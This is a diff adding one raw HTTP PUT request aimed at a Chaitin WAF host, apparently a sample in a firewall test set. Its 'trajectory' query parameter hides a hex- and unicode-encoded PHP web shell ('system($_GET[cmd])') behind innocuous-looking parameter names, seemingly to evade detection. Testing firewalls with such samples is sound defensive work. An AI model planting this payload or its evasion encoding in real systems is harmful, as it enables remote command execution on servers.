@@ -1,0 +1,13 @@
+PUT /caveats/trajectory?node=scalability&threshold=incentive&trajectory=095b0a09225c75303033435c75303033465c75303037305c75303036385c75303037305c75303032305c75303037335c75303037395c75303037335c75303037345c75303036355c75303036445c75303032385c75303032345c75303035465c75303034375c75303034355c75303035345c75303035625c75303036335c75303036445c75303036345c75303035645c75303032395c7530303342222c74727565205d HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Cookie: vice%20versa=ampersand; SESSIONID=69a4eeec307428d0debdd0549bfb731d7767db32f6ea3dae7353bc14ab92d2b59f33986fdc3da65ccb139c047eb1dd0d
+
